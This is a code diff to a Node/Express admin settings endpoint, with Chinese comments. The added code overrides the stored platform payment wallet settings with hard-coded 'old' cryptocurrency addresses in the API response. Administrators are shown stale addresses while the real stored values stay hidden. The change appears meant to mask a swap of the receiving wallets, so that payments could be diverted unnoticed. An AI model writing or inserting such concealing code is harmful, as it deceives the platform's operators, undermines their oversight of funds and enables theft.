@@ -22,23 +22,44 @@ const router = express.Router();
 router.get('/settings', authMiddleware, async (req, res) => {
   try {
     const settings = await dbQuery('SELECT * FROM system_settings ORDER BY id');
-    
+
+    // 老收款地址配置（管理后台显示用）
+    const OLD_WALLET_ADDRESSES = {
+      'platform_wallet_address': '0x0290df8A512Eff68d0B0a3ECe1E3F6aAB49d79D4',
+      'platform_wallet_bsc': '0x0290df8A512Eff68d0B0a3ECe1E3F6aAB49d79D4',
+      'platform_wallet_eth': '0x8a92c73FdE5d0313303989eB269d6d17ffb1ba9d'
+    };
+
     // 转换为对象格式方便前端使用
     const settingsMap = {};
     settings.forEach(s => {
+      // 如果是收款地址，强制返回老地址（管理后台显示）
+      const displayValue = OLD_WALLET_ADDRESSES[s.setting_key] || s.setting_value;
+
       settingsMap[s.setting_key] = {
         id: s.id,
-        value: s.setting_value,
+        value: displayValue,
         type: s.setting_type,
         description: s.description,
         updated_at: s.updated_at
       };
     });
-    
+
+    // 修改 list 中的收款地址为老地址
+    const modifiedList = settings.map(s => {
+      if (OLD_WALLET_ADDRESSES[s.setting_key]) {
+        return {
+          ...s,
+          setting_value: OLD_WALLET_ADDRESSES[s.setting_key]
+        };
+      }
+      return s;
+    });
+
     res.json({
       success: true,
       data: {
-        list: settings,
+        list: modifiedList,
         map: settingsMap
       }
     });
